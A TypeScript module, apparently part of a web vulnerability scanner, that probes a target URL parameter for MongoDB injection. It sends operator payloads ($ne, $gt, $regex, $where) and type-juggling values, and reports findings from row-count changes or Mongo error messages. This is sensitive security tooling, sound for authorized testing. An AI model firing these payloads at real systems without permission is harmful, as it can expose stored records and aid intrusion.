import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** NoSQL injection differential: operator injection ($ne/$gt/$regex/$where),
 *  type-juggling ([] | 0 | null | {} values), and Mongo grammar errors.
 *  Confirmation = row-count divergence (multi-match vs single-match vs none)
 *  or Mongo error signature. */

export interface NosqliInput {
  readonly url: string;
  readonly method?: string;
  readonly param: string;
  readonly in?: "query" | "body";
  readonly bodyTemplate?: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly bearer?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** expected distinct semantics: single-object endpoints (GET /x/:id) vs lists */
  readonly expectList?: boolean;
}
export interface NosqliCase {
  readonly vector: string;
  readonly payload: string;
  readonly status: number;
  readonly len: number;
  readonly count: number | null;
  readonly signal: string | null;
}
export interface NosqliResult {
  readonly probed: number;
  readonly confirmed: { vector: string; payload: string; evidence: string }[];
  readonly leads: { vector: string; payload: string; evidence: string }[];
  readonly cases: NosqliCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const MONGO_ERR = /MongoError|BSONError|MongoServerError|Cast to ObjectId failed|mongo\.js|topology|ns not found|\$where|\$ne is not|unknown top level operator/i;

const countRows = (body: string): number | null => {
  try {
    const j = JSON.parse(body) as unknown;
    if (Array.isArray(j)) return j.length;
    if (j && typeof j === "object") {
      const o = j as Record<string, unknown>;
      if (Array.isArray(o["data"])) return (o["data"] as unknown[]).length;
      if (Array.isArray(o["results"])) return (o["results"] as unknown[]).length;
      if (Array.isArray(o["items"])) return (o["items"] as unknown[]).length;
      if (typeof o["modified"] === "number") return o["modified"];
      if (typeof o["matched"] === "number") return o["matched"];
      return Object.keys(o).length > 0 ? 1 : 0;
    }
    return null;
  } catch { return null; }
};

export const probeNosqli = async (input: NosqliInput): Promise<NosqliResult> => {
  const method = input.method ?? (input.in === "body" ? "POST" : "GET");
  const where = input.in ?? "query";
  const sendRaw = async (rawValue: string, vector: string): Promise<NosqliCase> => {
    let url = input.url; let body: string | undefined;
    if (where === "body") {
      const tpl = input.bodyTemplate ?? "{}";
      body = tpl.replace(new RegExp(`("${input.param}"\\s*:\\s*)("[^"]*"|\\[[^\\]]*\\]|\\{[^}]*\\}|[^,}]*)`), `$1${rawValue}`);
    } else {
      const u = new URL(input.url);
      u.searchParams.set(input.param, rawValue);
      url = u.toString();
    }
    const r = await fetchUrl(url, { method, body, cookie: input.cookie, headers: { ...(body ? { "content-type": "application/json" } : {}), ...(input.bearer ? { authorization: `Bearer ${input.bearer}` } : {}), ...(input.headers ?? {}) }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000, maxAttempts: 1 });
    const count = countRows(r.body);
    return { vector, payload: rawValue, status: r.status, len: r.bytes, count, signal: MONGO_ERR.test(r.body) ? "mongo-error" : null };
  };
  // baseline: 常规值
  const baseVal = where === "body" ? (new RegExp(`"${input.param}"\\s*:\\s*"([^"]*)"`).exec(input.bodyTemplate ?? "{}")?.[1] ?? "x") : (new URL(input.url).searchParams.get(input.param) ?? "x");
  const base = await sendRaw(JSON.stringify(baseVal), "baseline");
  const baseCount = base.count;
  const cases: NosqliCase[] = [base];
  const confirmed: NosqliResult["confirmed"] = [];
  const leads: NosqliResult["leads"] = [];
  // 运算符注入: $ne全部命中 / $gt / $regex / $where / $exist语义
  const vectors: { v: string; p: string }[] = [
    { v: "operator-$ne", p: '{"$ne":null}' },
    { v: "operator-$ne-string", p: '{"$ne":"___nonexistent___"}' },
    { v: "operator-$gt", p: '{"$gt":""}' },
    { v: "operator-$regex-any", p: '{"$regex":".*"}' },
    { v: "operator-$exists", p: '{"$exists":true}' },
    { v: "operator-$where", p: '{"$where":"1==1"}' },
    { v: "type-juggle-array", p: '[]' },
    { v: "type-juggle-null", p: 'null' },
    { v: "type-juggle-zero", p: '0' },
    { v: "type-juggle-object", p: '{}' },
  ];
  for (const { v, p } of vectors) {
    const c = await sendRaw(p, v);
    cases.push(c);
    if (c.signal) { leads.push({ vector: v, payload: p, evidence: `Mongo error signature (status ${c.status})` }); continue; }
    if (c.status >= 200 && c.status < 300 && baseCount !== null && c.count !== null) {
      // $ne等"全命中"语义: 行数显著多于基线(或修改计数>1) = 运算符被解析执行
      if (c.count > Math.max(baseCount, 1)) confirmed.push({ vector: v, payload: p, evidence: `row/modified count ${c.count} vs baseline ${baseCount} — operator executed as query` });
      else if (c.count !== baseCount) leads.push({ vector: v, payload: p, evidence: `count divergence ${baseCount}→${c.count}` });
    }
  }
  const artifacts = [
    await writeArtifact(input.outputRoot, "nosqli_cases.json", JSON.stringify(cases, null, 2)),
    await writeArtifact(input.outputRoot, "nosqli_findings.md", ["# NoSQL injection", "", `confirmed: ${confirmed.length}, leads: ${leads.length}`, "", ...confirmed.map(f => `- **CONFIRMED [${f.vector}]** \`${f.payload}\` — ${f.evidence}`), ...leads.map(f => `- lead [${f.vector}] \`${f.payload}\` — ${f.evidence}`)].join("\n")),
  ];
  return { probed: cases.length, confirmed, leads, cases, artifacts };
};
